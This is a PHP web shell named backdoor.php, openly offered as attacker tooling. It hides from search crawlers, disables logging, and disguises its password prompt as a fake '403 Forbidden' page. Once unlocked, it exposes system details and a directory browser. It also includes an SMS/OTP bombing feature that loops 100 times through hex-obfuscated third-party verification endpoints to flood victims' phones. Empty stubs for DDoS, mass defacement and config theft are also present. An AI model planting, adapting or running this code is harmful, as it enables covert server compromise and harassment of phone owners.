<?php
/*
 * backdoor.php
 * 
 * Copyright 2018 Cvar1984 <Cvar1984@P22DX>
 * 
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
 * MA 02110-1301, USA.
 * 
 * 
 */
session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
$auth_pass = "e5f45a0a383440b5dcf789715c5c1ddd"; // pass : manusiabiasa
$errorforbidden = $_SERVER['REQUEST_URI'];
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
$userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
header('HTTP/1.0 404 Not Found');
exit;
}
}
function login_shell() {
?>
<?php 
//login shell
$errorforbidden = $_SERVER['REQUEST_URI'];
?>
<style type="text/css">
@import url(http://fonts.googleapis.com/css?family=Share+Tech+Mono);
body {
background:white;
color:black;
}
.button {
background-color:white;
border: none;
color: white;;
border-radius: 10px;
padding: 15px 32px;
text-align: center;
text-decoration: none;
font-family: Share Tech Mono;
display: inline-block;
font-size: 16px;
margin: 4px;
cursor: pointer;
}
.button:hover {
background: white;
color:white;
font-size: 21px;
}
.dropdown {
position: relative;
display: inline-block;
}

.dropdown-content {
display: none;
border-radius: 10px;
font-family: Share Tech Mono;
color:black;
position: center;
background-color: rgb(216, 216, 216);
animation-duration: 4s;
box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
padding: 12px 16px;
z-index: 1;
}

.dropdown:hover .dropdown-content {
display: block;

}
.sad {
background:green;
font-family: Share Tech Mono;
border:1px solid green;
}
input {
background: rgb(216, 216, 216);
border:1px solid black;
text-align:center;
}
</style>
<?
$errorforbidden = $_SERVER['REQUEST_URI'];
?>
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access <?php print $errorforbidden; ?>
 on this server.</p>
<p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html>
<center>
<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
<div class="dropdown">
<a href='https://www.fb.com/aingsad/' class="button">Login</a><br>
<div class="dropdown-content"><form method="post"><br><input type="password" 
onfocus="this.value=''" name="pass" value="Password"><button class="sad">login_shell</button></form></center></div>
</center>
<?php
?>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
else
login_shell();

//tempat CSS/html
echo "
<!DOCTYPE html>
<html>
<head>
	<title>Backdoor</title>
</head>
<style type='text/css'>
body {
	background:black;
	font-family: 'Orbitron';
	color:white;
}
@font-face {
  font-family: 'Orbitron';
  font-style: normal;
  font-weight: 700;
  src: local('Orbitron Bold'), local('Orbitron-Bold'), url(http://fonts.gstatic.com/s/orbitron/v9/yMJWMIlzdpvBhQQL_QIAUjh2qtA.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}
li {
	display: inline;
	background:green;
	border-radius:8px;
	padding:7px;
	margin:-1px;
	transition:0.7s;
}
li:hover {
	background:darkgreen;
	color:red;
	cursor:pointer;
}
a {
	color:#fff;
	text-decoration:none;
	font-family: 'Orbitron';
}
a:hover {
	color:gold;
}
table, tr, td {
   border:1px solid green;
}
td {
	border:none;
}
.table_home, .th_home, .td_home {
	border: 1px solid green;
	font-size: 17px;
}
#myInput {
  background-image: url('/css/searchicon.png');
  background-position: 10px 10px;
  background-repeat: no-repeat;
  width: 100%;
  font-size: 16px;
  padding: 12px 20px 12px 40px;
  border: 1px solid #ddd;
  margin-bottom: 12px;
}

#myTable {
  border-collapse: collapse;
  width: 100%;
  border: 1px solid #ddd;
  font-size: 18px;
}

#myTable th, #myTable td {
  text-align: left;
  padding: 12px;
}

#myTable tr {

}

#myTable tr.header, #myTable tr:hover {
  background-color: green;
}
.odang {
	background:green;
	padding:15px;
	width:900px;
}
.banteng {
    background:#1c1c1c;
}
.manteng {
	background:#1c1c1c;
	width:900px;
	padding:15px;
}
.santuy {
	background:green;
	width:903px;
	padding:15px;
	text-align:center;
}
</style>";
function perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
	$info = 'p';
	} else {
	// Unknown
	$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=green>".$perm."</font>";
	}
}
function r($dir,$perm) {
	if(!is_readable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=green>".$perm."</font>";
	}
}
error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);

echo "<center>";
echo "<table style='border:none'>";
echo "<tr><td>";
echo "<div class='odang'>
<a href='https://www.fb.com/AingSad'>About</a>
";
echo "</div>";
echo "<div class='banteng'>";
echo "System : ".php_uname()."<br>";
echo "PHP Version: ".@phpversion()." </br>";
echo "Hostname: <font color=green> ".$_SERVER['HTTP_HOST']."</font></br>";
echo "</center></table>";
echo "<p>";
echo "Current Dir: ";
foreach($scdir as $c_dir => $cdir) {	
	echo "<a href='?dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}   
// Function
function logout() {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
}
function spamsms() {
?>
<center>
<h1>Spam SMS</h1>
<form method="post">
<textarea rows="20" cols="50" name="no" placeholder='No HP ex : 888218005037 ' required></textarea>
<br>
<input type="submit" name="action"/>
</form>
</center>
<?php
function post_data($url,$data) {
	$ch=curl_init($url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	return curl_exec($ch);
	curl_close($ch);
}
if(isset($_POST['action'])) {
$no=explode("\n",$_POST['no']);
$no=str_replace(' ','',$no);
$no=str_replace("\n\n","\n",$no);
foreach($no as $on):
echo "Calling     -> ".$on."<br>";
	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70","msisdn=".$on."&accept=call");
endforeach;
for($x=0;$x<100;$x++) {
foreach($no as $on):
echo "Send OTP To -> ".$on."<br>";
	post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73","phone=".$on."&smsType=1");
	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50","phone_number=".$on);
endforeach;
}
} else {
	die();
}
die();
}
function ddos() {
}
function massdeface() {
}
function config() {
}
function jumping() {
}
// End function
?>
<center>
	<div class='manteng'>
		<li><a href='?'>Home</a></li>
		<li><a href='?do=sms'>Spam SMS</a></li>
		<li><a href='?do=jumping'>Jumping</a></li>
		<li><a href='?do=config'>Config</a></li>
		<li><a href='?do=logout'>Logout</a></li>
	</div>
</center>
<p>
<?php

if($_GET['do'] == 'logout') {
	logout();
}
elseif($_GET['do'] == 'sms') {
	spamsms();
}
echo "<table id='myTable' style='width:70%;' align=center>
  <tr class='header'>
<th>Name</th>
<th>Permohonan</th></tr>";
$dir=dirname("__DIR__");
$dir=scandir($dir);
$count=count($dir);
$size = filesize("$dir/$file")/1024;
$size = round($size,3);
if($size > 1024) {
				$size = round($size/1024,2). 'MB';
			} else {
				$size = $size. 'KB';
			}
for($x=2;$x<$count;$x++) {
echo "
<table style='width:70%;background:#1c1c1c;' align=center>
<td style='width:20px;'><img src='http://icons.iconarchive.com/icons/untergunter/leaf-mimes/512/text-plain-icon.png' style='width:23px;height:23px;'></td>
    <td style='background:#1c1c1c;'><a href='$dir[$x]'>$dir[$x]</a></td>
    <td style='width:710px;'><center>$size</center></td>
  </tr>
 </table>
";
}
?>
<div class="santuy">Copyright &copy; <?php echo date("Y")  ?> - <a href="#">Cvar1984</a></div>
